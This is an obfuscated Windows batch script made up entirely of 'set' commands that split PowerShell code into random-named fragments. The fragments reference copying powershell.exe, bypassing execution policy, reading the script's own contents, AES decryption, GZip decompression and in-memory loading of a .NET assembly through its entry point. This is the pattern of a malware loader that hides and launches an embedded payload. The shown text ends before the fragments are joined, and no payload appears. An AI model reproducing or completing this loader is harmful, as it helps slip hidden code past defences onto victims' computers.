@echo off
set "BHsHlAHSwf=ll"
set "JfLLTXzZKR=rs"
set "AzZXvNonFP=he"
set "USEOCuvSXp=ws"
set "KCsIhUmUeB=0\"
set "DVxWlBkJap=rS"
set "UZBuRkRWCS=.e"
set "ejUzlbZntK=we"
set "rwfGmXlhOG=em"
set "IRaJmBFKKu=Po"
set "ZIxppRoyiG=py"
set "pobxdDttXk=do"
set "EdtQqGYosb=s\"
set "qWJvjgagVp=1."
set "YJICRKlHbE=ll"
set "pDHwQtFsOn=po"
set "MMHEjcMezt= /"
set "HHOZJlnjRO=st"
set "TFIXNEkXdx=xe"
set "pdnvbyrvFc=32"
set "rtJOgGYKSG= C"
set "fsUrHZnles=:\"
set "zSHRLMteyL=\v"
set "mXbnJXougf=\W"
set "lmjzaxnskC=he"
set "pGCEWAXFfl=y "
set "dkNbGAvQet=Sy"
set "aFXenosFwf=nd"
set "pKvuwfCNXQ=Wi"
set "HbuDLHPpSJ=co"
set "tkGWNYVDkf=we"
set "tOxDKHehPJ=in"
set "JewlDHNfHq=ow"
set "SWxZgwoWMf=cd"
set "DDgYvzSmdG= %~dp0"
set "skYBxIvjGP== $q"
set "pmNsBQzcTe=L = "
set "sLTnIqSHsy=hy.A"
set "drFzucTXEn=zepi"
set "mHcmymwnBA='0Pg"
set "hgQWYIquvC=daeR"
set "CQXqxyQHGm=pose"
set "byYXyFIGYL=and "
set "EYXTJajWUg=)($z"
set "bpUfFNgTyA=gsYZ"
set "xiUpEdJHDz=epiL"
set "cVZFbOAcGQ=ring"
set "ruRUzBmCCj=6] -"
set "BznQnGuJuw=ddin"
set "NtYBoKtsNO=$zep"
set "cehzBZqsjX=XAV "
set "qFBiLOqaHi=)))"
set "GeEEIAiUDu=ddin"
set "BILbRHEoyO=ose("
set "DFCBGVINEO=rt]:"
set "EdDeGXLmkt=yTo("
set "cDaaMhfveF=FVp."
set "jBeWkGcUpC=;$pd"
set "FOlUPYJypn=.Mem"
set "JdOPmOKexu=.-16"
set "xaBzxPHgAR=m(, "
set "DPIXuNMAlv=  $I"
set "NWtrhrlRvM=L = "
set "wAtEiwtCUy='[-1"
set "LOVsxWLAGb=orF'"
set "kUpDMAUmBL= = N"
set "xrVApwNaZg= [Sy"
set "rDIUTYXZQl=y.Pa"
set "VlRuASdnlk=yste"
set "BvQjubNfyR=ck($"
set "LpigFKhtKq=..-1"
set "nsOXqnZsiE=V = "
set "qNPCkugIzp=dw.D"
set "eLqojWMtan=ose("
set "gqZgMKCqHO=sEq."
set "nSuRheInFX=eam("
set "YetvrUjqnu= New"
set "pilzNDTuEQ=.Cre"
set "UcLfdlUIoH=l5E7"
set "YGcsWyEWBq==');"
set "tOvBTHjxhA=$zep"
set "uYNKnpUwlz=[-1."
set "UaUzcLewGL=:: '"
set "yyCdeHkMab=stem"
set "PbEPkshloa=();$"
set "ulRVlUoigg=oryS"
set "neZhUBVEkk=fZnd"
set "DifwTigTNx=:('g"
set "rIwwBerlHS=.Sec"
set "MKgVvmnsvR= = $"
set "bNbsxJOlNs=.Com"
set "haPOddSpFe=y.Cr"
set "mZNhLyZQGy=ispo"
set "qAmlUecLwk=qGMk"
set "sxKGXMKaRX=$qGM"
set "NZFVVxqBoJ= if "
set "AcGxyxiTEU=Syst"
set "uRBVFIJEiP=GMkU"
set "mmjUHwlmbc=zepi"
set "miklcaHnOv=jxFV"
set "UHLfEnTfBb=ypto"
set "exzJSqHcJa=Qa.T"
set "xRXYlMcpUP=YxVw"
set "EXihUzUash=]::("
set "tQyGefKIyo=grap"
set "MxYIXawJKI=gMod"
set "uTPXNwZzik=th('"
set "fUVZsCIwGd=Comp"
set "TSNdEYkqYj=Obje"
set "bRbDKHMYIa=-1.."
set "rDmzqUWulT=r) {"
set "gUfUzmLUPS=rity"
set "ZfdZxPrccH= [st"
set "usAFIOWfXG=epiL"
set "EPvlsSKJye=sEq "
set "RRrzjLwJje=ress"
set "uBIIGhuEIW=g = "
set "ohGwBVkZaW=)) {"
set "masgzKpsYO=Secu"
set "wzHWXaXNfq=.Mod"
set "vpjvlVaiap=join"
set "aubMVJfKjU=New-"
set "oTMibxobmF=dfKE"
set "mGTbVEAKZU=nirt"
set "CBpWPtJsyw=$aHP"
set "gNqAhlJeaW=y]::"
set "VloZIpLXre=m.IO"
set "yFuzIXqBBd=;$jx"
set "uLadYIbsCL=pres"
set "BonIltzdfX=S46e"
set "ziAOqOXase=pher"
set "ZDllFvWuiO=q.Su"
set "iJdzrZDeXq=y.Ci"
set "RoquKvzTre=zHhH"
set "ZHxATemsER=mory"
set "UwtidLCnog= = $"
set "VWeNMAWpzK=sion"
set "VRLzqYTpJQ=('%~f0'"
set "MEgaiDXvvK=F'[-"
set "AwhVDWCaGR=n ''"
set "oPkLuQnvYn=tem."
set "AtetjfuZDj=ing("
set "zpeHprtrrh=ment"
set "bDQlmdHOqx=iL);"
set "EngSktJZgd=L, 0"
set "maylHfrXeo=xosE"
set "XVgyFRMyJV=..-1"
set "MpyWDKPVgz=Obje"
set "aFHHdaIMqJ=Conv"
set "tkQqLjNxxn=d;$q"
set "ThajoAKXlh= '')"
set "TbnxQhUIDa=m.Re"
set "ueGsdhAUDW=Mode"
set "AaromjhoJC=ew-O"
set "qsNgirBiKY=nage"
set "bKHrDSYCte=.IO."
set "FnBvXABrju=ay()"
set "BMKRLnEalw=$aHP"
set "AVSrLSfBgk=tryP"
set "yanozRZbPP=stem"
set "CpCMrZktFB=am;$"
set "yWTZeEgxSN=Comp"
set "JISRZrcloa= [Sy"
set "sSOtxnkvJA=();$"
set "MCbCcimJoe=[Sys"
set "JppwLbhpzg=PxEW"
set "ELgSHjYTEc=ct S"
set "ZvEmzPtttu=$oOF"
set "HdDMtIYrxB='gni"
set "votySAGsDk=I.En"
set "dWaSyqpLAo=e]::"
set "aXQYsmcskc=; };"
set "ErKmvsnOZZ=);$q"
set "MzLcacUuZR=$jxF"
set "epSHbYQWge=ke($"
set "YAWidbZZWQ=Zndw"
set "zOpQOYyKNe=rity"
set "PnMCKnAEqp=raph"
set "NkfafQhMHJ=tsWi"
set "hGzQBUDTsL=tem."
set "DxJioHAdWd=File"
set "xkGVDaPtOw=TllA"
set "VqCcgKbgzU=t Sy"
set "IwqDHhAUFA=ion."
set "KpFIWwUsyh=, (,"
set "BCplynqcuE=GMkU"
set "ecGaHffnSt=ewLi"
set "qaVAgSHnIT=rans"
set "hYahcldZBk=w = "
set "MrFQZDpuKf=ct S"
set "QtqFPkyoiB=urit"
set "lxupXAlxkT=.Key"
set "JHLGCJkzbR=Disp"
set "WYkWRKGKlZ=s75K"
set "VnBLXsSNcg=embl"
set "KPqWwsfwYP=New-"
set "FDbGkSJMBi=bstr"
set "ZcFLTTlAEh=em.C"
set "laCVuSwBJr=NPOS"
set "lBkyUnnMuB='[-1"
set "OZOogIMKmJ=).Sp"
set "SrqbZyWgZG=GMkU"
set "srQGehjzWR=.GZi"
set "zbuclJhGle=oL'["
set "FwoasvwWFY=$aHP"
set "RNJWXGMYmV=BC;$"
set "UjhYpRvTNf=tem."
set "LpOHLjWdsO=Syst"
set "vtBIvizUqa=3); "
set "CRYMFrWGTg=('da"
set "kRZLJhdSan=RmAx"
set "yrXeCuRGnx=ptog"
set "htpMFzAuWv=raph"
set "efDeWUJAVV=bjec"
set "jmrWBCRqxU=fore"
set "KrGEMxIeaj=ach "
set "dhWRkDDJem=[Env"
set "DSbpQwRnOJ=yste"
set "cttmWbGwrV=]::("
set "yCvLIdwlXb=Vp, "
set "pFYRxzXZyZ=[IO."
set "kpkWOMKEXx='txe"
set "XYtkkynyHL=ress"
set "owyvtKWEBB=vert"
set "KgljFQxZpU=kU.I"
set "cacghJdftj=::De"
set "hQqlRQVeLr== [S"
set "VgkcueQFqy=Disp"
set "ARAfVrUDdO=)($I"
set "udyQlgCSuK=.Ass"
set "gTkloNqGXu=NPOS"
set "knonUzPWan=ecry"
set "UxJRspqrKI=);$q"
set "TYFumtmbMe=ptog"
set "TcmTwRfBIq=comp"
set "DxHgJXFKHU=, $z"
set "vmUWGesnoy=-joi"
set "saaNLjimFL=rtS4"
set "GYgXpddKdD=[Sys"
set "SlbEXSMeAl=;$NZ"
set "gqQCBsgctk=form"
set "mDGEXGfOJa=oArr"
set "lmHVOdznYf=1] -"
set "oyJkWuFVCw=);$p"
set "PuKDWusXTA=16] "
set "GFiJPIagfI='')("
set "OLxwIfoNWp=NZcn"
set "QuJRLJVtgw=.Cop"
set "fkJdGTSgKQ=fKE."
set "RsHwHCwqzW=oint"
set "BrRfAFKoAG=-ep "
set "umMcPrkVJU=GMkU"
set "rXezJnoXYb=.Len"
set "kFeZmVgSFW=zepi"
set "mgzXniloeX=($xo"
set "pSkHmIZSaP=brea"
set "dmSsHWVrhH=ode]"
set "WIsixUFdKQ=tion"
set "dSASPLlrrI=pStr"
set "zjzwDuckXQ=yr ="
set "HGQDbOnxNC=]::C"
set "uqutQBsVHC=tS46"
set "NNVLZdkPIy=::('"
set "ecSWVLQucX=n ''"
set "vbKBtyYbkB=.Con"
set "UCnEcOcoBS=ne);"
set "zKkCgjIydB=$FaX"
set "rDIakrIxkF=AV.T"
set "EivdWxkZxV=ateD"
set "udhcEOKjKE=[]] "
set "InXEHkYzOU=ptor"
set "VMqOxjtHFY=CFxo"
set "zJAaITsXNB=U.Pa"
set "GsvkmsciDt=le  "
set "jtfepurFZg=em.I"
set "mBvzSGAcFo=($xo"
set "gLlcBtRYif=.Dis"
set "vkNMheFKqQ=[Sys"
set "tvUcVkotgP=Fina"
set "MmQDbaVkFq=106u"
set "oOPXJDWJSF=in $"
set "iaKOlAtHDr=bypa"
set "bbUqBTVBTM=ect "
set "ztesZbIzfG=('Tg"
set "STglQepuzz=();$"
set "EYIdUlTLbK=Bmor"
set "rFQCIUEZXT=7;$q"
set "hSPdpldcMV=-Obj"
set "REythinuvC=lit("
set "qxlUYfxtrY=-joi"
set "EjUVPuKsut=p = "
set "wySyheoOgG=-4] "
set "TZgjAlYUnm=pose"
set "OpSpiaCcHe=yste"
set "IYwdDnKlCo=oin "
set "JsqZQXaSuB=Secu"
set "uvwemcUPMh=flec"
set "umwojikgSk=.Cry"
set "SBgwDswhjs=trea"
set "fXosGdMuJs=oOFy"
set "dkxSLIWPbh=Stre"
set "LzThMGdWeC=]::N"
set "wmlAydOKde=PKCS"
